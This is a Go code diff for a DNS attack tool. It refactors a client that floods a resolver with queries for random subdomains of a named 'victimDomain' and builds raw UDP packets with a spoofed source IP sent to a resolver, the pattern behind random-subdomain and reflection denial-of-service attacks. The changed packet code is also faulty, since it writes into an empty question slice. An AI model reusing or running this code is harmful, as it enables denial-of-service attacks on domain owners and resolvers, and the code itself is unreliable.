@@ -2,7 +2,6 @@ package internal
 
 import (
 	"fmt"
-	"log"
 	"math/rand"
 	"net"
 	"time"
@@ -14,24 +13,28 @@ import (
 )
 
 type DNSClient struct {
-	hostPort string
-	client   *dns.Client
+	hostPort     string
+	nQuestions   int
+	victimDomain string
+	client       *dns.Client
 }
 
 var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
 
-func NewDNSClient(hostPort string) (c DNSClient) {
+func NewDNSClient(hostPort string, nQuestions int, victimDomain string) (c DNSClient) {
 	client := new(dns.Client)
 	return DNSClient{
-		hostPort: hostPort,
-		client:   client,
+		hostPort:     hostPort,
+		nQuestions:   nQuestions,
+		victimDomain: victimDomain,
+		client:       client,
 	}
 }
 
-func (c DNSClient) SendJunkDomainsRequest(nQuestions int, victimDomain string) (rtt time.Duration, dnsError string, err error) {
+func (c DNSClient) SendJunkDomainsRequest() (rtt time.Duration, dnsError string, err error) {
 	m := new(dns.Msg)
-	for i := 0; i < nQuestions; i++ {
-		m.SetQuestion(dns.CanonicalName(c.randomDomain(victimDomain)), dns.TypeMX)
+	for i := 0; i < c.nQuestions; i++ {
+		m.SetQuestion(c.randomSubDomain(), dns.TypeA)
 	}
 	r, rtt, err := c.client.Exchange(m, c.hostPort)
 	if err != nil {
@@ -41,76 +44,59 @@ func (c DNSClient) SendJunkDomainsRequest(nQuestions int, victimDomain string) (
 	return
 }
 
-func createPacket(targetIP net.IP, targetPort int, resolverIP net.IP) []byte {
+func (c DNSClient) createPacket(source, destination net.IP, sourcePort int) (packet []byte, err error) {
 	buf := gopacket.NewSerializeBuffer()
 	opts := gopacket.SerializeOptions{
 		FixLengths:       true,
 		ComputeChecksums: true,
 	}
-
 	ipLayer := &layers.IPv4{
 		Version:  4,
 		TTL:      255,
-		SrcIP:    targetIP,
-		DstIP:    resolverIP,
+		SrcIP:    source,
+		DstIP:    destination, // resolver IP
 		Protocol: layers.IPProtocolUDP,
 	}
 	udpLayer := &layers.UDP{
-		SrcPort: layers.UDPPort(targetPort),
+		SrcPort: layers.UDPPort(sourcePort),
 		DstPort: layers.UDPPort(53),
 	}
 	dnsLayer := &layers.DNS{
-		// Header fields
-		ID:     42,
+		ID:     uint16(rand.Uint32()),
 		QR:     false, // QR=0 is query
 		OpCode: layers.DNSOpCodeQuery,
 		RD:     true,
-		// Entries
-		Questions: []layers.DNSQuestion{
-			{
-				Name:  []byte("cloudflare.com"),
-				Type:  layers.DNSTypeA,
-				Class: 1,
-			},
-		},
-		Additionals: []layers.DNSResourceRecord{
-			{
-				Type:  layers.DNSTypeOPT,
-				Class: 4096,
-			},
-		},
 	}
-	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
+	for i := 0; i < c.nQuestions; i++ {
+		dnsLayer.Questions[i] = layers.DNSQuestion{
+			Name:  []byte(c.randomSubDomain()),
+			Type:  layers.DNSTypeA,
+			Class: 1,
+		}
+	}
+	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
 	if err != nil {
-		log.Fatalf("Failed to set network layer for checksum: %v\n", err)
+		err = fmt.Errorf("failed to set network layer for checksum: %v", err)
+		return
 	}
-
 	err = gopacket.SerializeLayers(buf, opts, ipLayer, udpLayer, dnsLayer)
 	if err != nil {
-		log.Fatalf("Failed to serialize packet: %v\n", err)
+		err = fmt.Errorf("failed to serialize packet: %v", err)
+		return
 	}
-	packetData := buf.Bytes()
-	// fmt.Println(hex.Dump(packetData))
-	return packetData
+	return buf.Bytes(), nil
 }
 
-func (c *DNSClient) randomDomain(victimDomain string) string {
-	if len(victimDomain) == 0 {
-		return fmt.Sprintf(
-			"%s.%s",
-			c.randomString(64),
-			c.randomString(3),
-		)
-	}
+func (c *DNSClient) randomSubDomain() string {
 	return fmt.Sprintf(
-		"%s.%s",
+		"%s.%s.",
 		c.randomString(32),
-		victimDomain,
+		c.victimDomain,
 	)
 }
 
-func (c *DNSClient) randomString(length int) string {
-	actualLen := rand.Intn(length-1) + 1
+func (c *DNSClient) randomString(maxLen int) string {
+	actualLen := rand.Intn(maxLen-1) + 1
 	b := make([]rune, actualLen)
 	for i := range b {
 		b[i] = letterRunes[rand.Intn(len(letterRunes))]
